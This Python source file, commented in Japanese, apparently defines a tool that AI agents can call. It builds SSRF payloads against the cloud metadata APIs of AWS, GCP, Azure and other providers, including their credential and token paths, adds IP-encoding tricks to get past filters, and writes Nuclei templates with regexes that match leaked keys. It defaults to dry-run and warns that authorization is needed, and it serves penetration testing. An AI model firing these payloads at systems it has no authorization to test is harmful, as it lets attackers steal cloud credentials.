"""
Cloud Metadata Scanner - クラウドメタデータAPI診断ツール

SSRF脆弱性を通じてクラウドメタデータAPIへのアクセス可否を検出。
AWS/GCP/Azureのインスタンスメタデータ漏洩リスクを特定する。

SECURITY NOTE:
- デフォルトでdry-runモード（ペイロード生成のみ）
- 実行には明示的な--executeフラグが必要
"""
from typing import Dict, Any, List, Optional
import json
from src.tools.base import BaseTool
from src.tools import ToolRegistry


@ToolRegistry.register
class CloudMetadataScannerTool(BaseTool):
    """
    CloudMetadataScanner - クラウドメタデータAPI診断
    
    SSRF脆弱性を利用したクラウドメタデータ取得の可能性を検出。
    AWS IMDSv1/v2、GCP、Azureのメタデータエンドポイントを対象。
    
    WARNING: 実行時は必ずスコープを確認し、許可を得てから使用すること。
    """
    
    name = "cloud_metadata_scanner"
    description = (
        "Generate SSRF payloads for cloud metadata API testing. "
        "Dry-run by default. Requires explicit --execute flag for active testing."
    )
    
    # クラウドメタデータエンドポイント
    METADATA_ENDPOINTS = {
        "aws_imdsv1": {
            "url": "http://169.254.169.254/latest/meta-data/",
            "headers": {},
            "description": "AWS EC2 Instance Metadata Service v1",
            "sensitive_paths": [
                "iam/security-credentials/",
                "iam/info",
                "identity-credentials/ec2/security-credentials/",
                "hostname",
                "local-ipv4",
                "public-ipv4",
                "public-hostname",
            ],
        },
        "aws_imdsv2": {
            "url": "http://169.254.169.254/latest/meta-data/",
            "headers": {"X-aws-ec2-metadata-token": "<TOKEN>"},
            "token_url": "http://169.254.169.254/latest/api/token",
            "token_method": "PUT",
            "token_headers": {"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
            "description": "AWS EC2 Instance Metadata Service v2 (token required)",
            "sensitive_paths": [
                "iam/security-credentials/",
            ],
        },
        "gcp": {
            "url": "http://metadata.google.internal/computeMetadata/v1/",
            "headers": {"Metadata-Flavor": "Google"},
            "description": "Google Cloud Platform Metadata Server",
            "sensitive_paths": [
                "instance/service-accounts/default/token",
                "instance/attributes/",
                "project/project-id",
                "instance/hostname",
            ],
        },
        "azure": {
            "url": "http://169.254.169.254/metadata/instance",
            "headers": {"Metadata": "true"},
            "params": "api-version=2021-02-01",
            "description": "Azure Instance Metadata Service",
            "sensitive_paths": [
                "identity/oauth2/token",
                "compute",
                "network",
            ],
        },
        "digitalocean": {
            "url": "http://169.254.169.254/metadata/v1/",
            "headers": {},
            "description": "DigitalOcean Droplet Metadata",
            "sensitive_paths": [
                "id",
                "hostname",
                "user-data",
            ],
        },
        "alibaba": {
            "url": "http://100.100.100.200/latest/meta-data/",
            "headers": {},
            "description": "Alibaba Cloud ECS Metadata",
            "sensitive_paths": [
                "ram/security-credentials/",
                "instance-id",
            ],
        },
    }
    
    # SSRF検出用パラメータパターン
    SSRF_PARAM_PATTERNS = [
        "url", "uri", "redirect", "redirect_uri", "redirect_url",
        "next", "target", "dest", "destination", "rurl", "goto",
        "link", "feed", "host", "site", "html", "load", "file",
        "document", "folder", "root", "path", "pg", "style",
        "pdf", "template", "php_path", "doc", "page", "callback",
        "return", "return_url", "returnurl", "return_path",
        "image", "img", "src", "source", "data", "reference",
        "proxy", "proxyurl", "proxy_url", "request", "fetch",
    ]
    
    # 危険なレスポンスパターン（メタデータ漏洩の証拠）
    SENSITIVE_PATTERNS = [
        r"AKIA[0-9A-Z]{16}",  # AWS Access Key ID
        r"ASIA[0-9A-Z]{16}",  # AWS Temporary Access Key ID
        r"\"AccessKeyId\"",
        r"\"SecretAccessKey\"",
        r"\"Token\":\s*\"ey",  # JWT-like token
        r"\"access_token\":\s*\"",
        r"\"id_token\":\s*\"",
        r"arn:aws:iam::",
        r"projects/[0-9]+/",  # GCP project
        r"\"subscriptionId\":\s*\"",  # Azure subscription
        r"metadata\.google\.internal",
        r"computeMetadata",
    ]

    def to_schema(self) -> Dict[str, Any]:
        return {
            "type": "function",
            "function": {
                "name": self.name,
                "description": self.description,
                "parameters": {
                    "type": "object",
                    "properties": {
                        "target_url": {
                            "type": "string",
                            "description": "Target URL with potential SSRF parameter"
                        },
                        "mode": {
                            "type": "string",
                            "enum": ["dry-run", "analyze", "generate"],
                            "description": (
                                "dry-run: Generate payloads only (default). "
                                "analyze: Analyze URL for SSRF parameters. "
                                "generate: Generate nuclei template for manual testing."
                            ),
                            "default": "dry-run"
                        },
                        "cloud": {
                            "type": "string",
                            "enum": ["aws", "gcp", "azure", "all"],
                            "description": "Target cloud provider",
                            "default": "all"
                        },
                        "parameter": {
                            "type": "string",
                            "description": "Specific parameter to inject (optional)"
                        }
                    },
                    "required": ["target_url"]
                }
            }
        }

    def run(
        self, 
        target_url: str = "", 
        mode: str = "dry-run",
        cloud: str = "all",
        parameter: Optional[str] = None,
        **kwargs
    ) -> str:
        """
        クラウドメタデータスキャン/ペイロード生成
        
        NOTE: このツールはデフォルトでdry-runモードで動作し、
        実際のリクエストは送信しません。
        """
        # 入力バリデーション
        if not target_url:
            return json.dumps({"error": "Target URL is required"})
        
        if any(c in target_url for c in [";", "|", "&", "`", "\n"]):
            return json.dumps({"error": "Unsafe characters in target URL"})
        
        if mode == "analyze":
            return self._analyze_url(target_url)
        
        elif mode == "generate":
            return self._generate_nuclei_template(target_url, cloud, parameter)
        
        elif mode == "dry-run":
            return self._generate_payloads(target_url, cloud, parameter)
        
        return json.dumps({"error": f"Unknown mode: {mode}"})

    def _analyze_url(self, url: str) -> str:
        """URLからSSRFパラメータ候補を分析"""
        from urllib.parse import urlparse, parse_qs
        
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
        except Exception as e:
            return json.dumps({"error": f"Failed to parse URL: {str(e)}"})
        
        ssrf_candidates = []
        
        for param_name in params.keys():
            param_lower = param_name.lower()
            
            # パターンマッチ
            matched_patterns = [
                p for p in self.SSRF_PARAM_PATTERNS
                if p in param_lower or param_lower in p
            ]
            
            if matched_patterns:
                ssrf_candidates.append({
                    "parameter": param_name,
                    "current_value": params[param_name][0] if params[param_name] else "",
                    "matched_patterns": matched_patterns,
                    "risk_level": "HIGH" if len(matched_patterns) > 1 else "MEDIUM",
                })
        
        # パス内のSSRFポイントを検出
        path_candidates = []
        path_parts = parsed.path.split("/")
        for i, part in enumerate(path_parts):
            if any(pattern in part.lower() for pattern in ["url", "file", "path", "load"]):
                path_candidates.append({
                    "position": i,
                    "value": part,
                    "risk_level": "MEDIUM",
                })
        
        return json.dumps({
            "url": url,
            "analysis": {
                "ssrf_parameter_candidates": ssrf_candidates,
                "path_injection_points": path_candidates,
                "total_parameters": len(params),
            },
            "recommendation": (
                f"Found {len(ssrf_candidates)} potential SSRF parameters. "
                "Use 'generate' mode to create test payloads."
                if ssrf_candidates else
                "No obvious SSRF parameters detected. Consider manual analysis."
            )
        }, indent=2)

    def _generate_payloads(
        self, 
        url: str, 
        cloud: str,
        parameter: Optional[str]
    ) -> str:
        """SSRFペイロードを生成（実行はしない）"""
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
        except Exception as e:
            return json.dumps({"error": f"Failed to parse URL: {str(e)}"})
        
        # ターゲットパラメータ決定
        target_params = [parameter] if parameter else list(params.keys())
        
        if not target_params:
            return json.dumps({
                "error": "No parameters found in URL. Provide a parameter explicitly.",
                "suggestion": "Add ?url= or similar parameter to the URL"
            })
        
        # クラウドエンドポイント選択
        endpoints = self._select_endpoints(cloud)
        
        payloads: List[Dict[str, Any]] = []
        
        for param in target_params:
            for cloud_name, endpoint_info in endpoints.items():
                base_url = endpoint_info["url"]
                
                for path in endpoint_info["sensitive_paths"]:
                    full_payload_url = base_url + path
                    
                    # URLエンコードバリエーション
                    variations = self._generate_url_variations(full_payload_url)
                    
                    for var_name, var_url in variations.items():
                        # 新しいクエリパラメータを構築
                        new_params = params.copy()
                        new_params[param] = [var_url]
                        
                        new_query = urlencode(new_params, doseq=True)
                        payload_url = urlunparse((
                            parsed.scheme,
                            parsed.netloc,
                            parsed.path,
                            parsed.params,
                            new_query,
                            parsed.fragment
                        ))
                        
                        payloads.append({
                            "cloud": cloud_name,
                            "parameter": param,
                            "path": path,
                            "variation": var_name,
                            "payload_url": payload_url,
                            "metadata_url": full_payload_url,
                            "required_headers": endpoint_info.get("headers", {}),
                            "description": endpoint_info["description"],
                        })
        
        return json.dumps({
            "mode": "dry-run",
            "warning": "These payloads are for authorized testing only. Do NOT execute without permission.",
            "target_url": url,
            "payloads_generated": len(payloads),
            "payloads": payloads[:100],  # 上限100
            "detection_patterns": self.SENSITIVE_PATTERNS[:5],
            "next_steps": [
                "1. Confirm you have authorization to test this target",
                "2. Use 'generate' mode to create a nuclei template",
                "3. Or manually test payloads with curl/httpx",
                "4. Look for sensitive patterns in responses",
            ]
        }, indent=2)

    def _generate_nuclei_template(
        self, 
        url: str, 
        cloud: str,
        parameter: Optional[str]
    ) -> str:
        """Nucleiテンプレートを生成"""
        from urllib.parse import urlparse, parse_qs
        
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
        except Exception:
            return json.dumps({"error": "Failed to parse URL"})
        
        target_param = parameter or (list(params.keys())[0] if params else "url")
        endpoints = self._select_endpoints(cloud)
        
        # Nuclei YAML生成
        template_lines = [
            "id: cloud-metadata-ssrf",
            "",
            "info:",
            "  name: Cloud Metadata SSRF Detection",
            "  author: shigoku",
            "  severity: critical",
            "  description: Detects SSRF vulnerabilities that can access cloud metadata APIs",
            "  tags: ssrf,cloud,aws,gcp,azure",
            "",
            "http:",
            "  - raw:",
        ]
        
        # リクエスト生成
        for _, endpoint_info in list(endpoints.items())[:3]:
            base_url = endpoint_info["url"]
            path = endpoint_info["sensitive_paths"][0]
            
            request = "    - |"
            template_lines.append(request)
            template_lines.append(f"      GET {parsed.path}?{target_param}={base_url}{path} HTTP/1.1")
            template_lines.append(f"      Host: {parsed.netloc}")
            for header, value in endpoint_info.get("headers", {}).items():
                template_lines.append(f"      {header}: {value}")
            template_lines.append("")
        
        template_lines.extend([
            "    matchers-condition: or",
            "    matchers:",
            "      - type: regex",
            "        regex:",
            '          - "AKIA[0-9A-Z]{16}"',
            '          - "ASIA[0-9A-Z]{16}"',
            '          - "arn:aws:iam::"',
            '          - "computeMetadata"',
            '          - "\"access_token\""',
            "",
            "      - type: word",
            "        words:",
            '          - "SecretAccessKey"',
            '          - "AccessKeyId"',
            '          - "metadata.google.internal"',
        ])
        
        template_content = "\n".join(template_lines)
        
        return json.dumps({
            "mode": "generate",
            "nuclei_template": template_content,
            "usage": f"Save to cloud-metadata-ssrf.yaml and run: nuclei -t cloud-metadata-ssrf.yaml -u {url}",
            "warning": "Only use on systems you have authorization to test!"
        }, indent=2)
    
    def _select_endpoints(self, cloud: str) -> Dict[str, Dict[str, Any]]:
        """クラウドエンドポイントを選択"""
        if cloud == "all":
            return self.METADATA_ENDPOINTS
        elif cloud == "aws":
            return {k: v for k, v in self.METADATA_ENDPOINTS.items() if k.startswith("aws")}
        elif cloud == "gcp":
            return {"gcp": self.METADATA_ENDPOINTS["gcp"]}
        elif cloud == "azure":
            return {"azure": self.METADATA_ENDPOINTS["azure"]}
        return {}

    def _generate_url_variations(self, url: str) -> Dict[str, str]:
        """URLエンコードバリエーションを生成"""
        from urllib.parse import quote
        
        return {
            "plain": url,
            "double_encoded": quote(quote(url, safe="")),
            "unicode": url.replace(".", "。"),  # Unicode bypass attempt
            "with_port": url.replace("://", "://169.254.169.254:80@") if "169.254" in url else url,
            "decimal_ip": url.replace("169.254.169.254", "2852039166"),  # Decimal IP
            "hex_ip": url.replace("169.254.169.254", "0xa9fea9fe"),  # Hex IP
        }
